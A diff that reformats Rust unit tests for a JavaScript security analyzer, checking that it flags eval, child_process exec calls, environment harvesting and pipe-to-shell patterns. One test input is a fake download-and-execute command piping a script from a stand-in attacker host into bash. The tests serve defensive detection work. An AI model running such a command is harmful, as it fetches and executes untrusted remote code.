@@ -445,7 +445,10 @@ mod tests {
             .iter()
             .filter(|f| f.title.contains("eval()"))
             .collect();
-        assert!(!matched.is_empty(), "should detect eval with dynamic content");
+        assert!(
+            !matched.is_empty(),
+            "should detect eval with dynamic content"
+        );
         assert_eq!(matched[0].severity, Severity::Critical);
     }
 
@@ -464,27 +467,33 @@ mod tests {
     fn detects_child_process_exec() {
         // The regex matches child_process followed by one of ')]  then .exec(
         // This fires for unquoted bracket/call patterns.
-        let findings = analyze_js(
-            "var cp = x[child_process].exec('ls');\n",
-        );
+        let findings = analyze_js("var cp = x[child_process].exec('ls');\n");
         let matched: Vec<_> = findings
             .iter()
-            .filter(|f| f.category == FindingCategory::ProcessSpawn && f.severity == Severity::Critical)
+            .filter(|f| {
+                f.category == FindingCategory::ProcessSpawn && f.severity == Severity::Critical
+            })
             .collect();
-        assert!(!matched.is_empty(), "should detect child_process exec call, got: {:?}", findings);
+        assert!(
+            !matched.is_empty(),
+            "should detect child_process exec call, got: {:?}",
+            findings
+        );
     }
 
     #[test]
     fn detects_pipe_to_shell() {
         // Put curl|bash inside a string so comment_strip doesn't eat the URL
-        let findings = analyze_js(
-            r#"const cmd = "curl http://evil.com/script.sh | bash";"#,
-        );
+        let findings = analyze_js(r#"const cmd = "curl http://evil.com/script.sh | bash";"#);
         let matched: Vec<_> = findings
             .iter()
             .filter(|f| f.title.contains("Pipe-to-shell"))
             .collect();
-        assert!(!matched.is_empty(), "should detect pipe-to-shell pattern, got: {:?}", findings);
+        assert!(
+            !matched.is_empty(),
+            "should detect pipe-to-shell pattern, got: {:?}",
+            findings
+        );
         assert_eq!(matched[0].severity, Severity::Critical);
     }
 
@@ -495,7 +504,10 @@ mod tests {
             .iter()
             .filter(|f| f.title == "require('child_process')")
             .collect();
-        assert!(!matched.is_empty(), "should detect require('child_process')");
+        assert!(
+            !matched.is_empty(),
+            "should detect require('child_process')"
+        );
         assert_eq!(matched[0].severity, Severity::High);
     }
 
@@ -509,7 +521,11 @@ mod tests {
             .iter()
             .filter(|f| f.category == FindingCategory::EnvAccess)
             .collect();
-        assert!(!matched.is_empty(), "should detect env harvesting, got: {:?}", findings);
+        assert!(
+            !matched.is_empty(),
+            "should detect env harvesting, got: {:?}",
+            findings
+        );
         assert_eq!(matched[0].severity, Severity::High);
     }
 
@@ -520,7 +536,10 @@ mod tests {
             .iter()
             .filter(|f| f.title.contains("eval()"))
             .collect();
-        assert!(matched.is_empty(), "should NOT flag eval inside a single-line comment");
+        assert!(
+            matched.is_empty(),
+            "should NOT flag eval inside a single-line comment"
+        );
     }
 
     #[test]
@@ -530,7 +549,10 @@ mod tests {
             .iter()
             .filter(|f| f.title.contains("eval()"))
             .collect();
-        assert!(matched.is_empty(), "should NOT flag eval inside a block comment");
+        assert!(
+            matched.is_empty(),
+            "should NOT flag eval inside a block comment"
+        );
     }
 
     #[test]
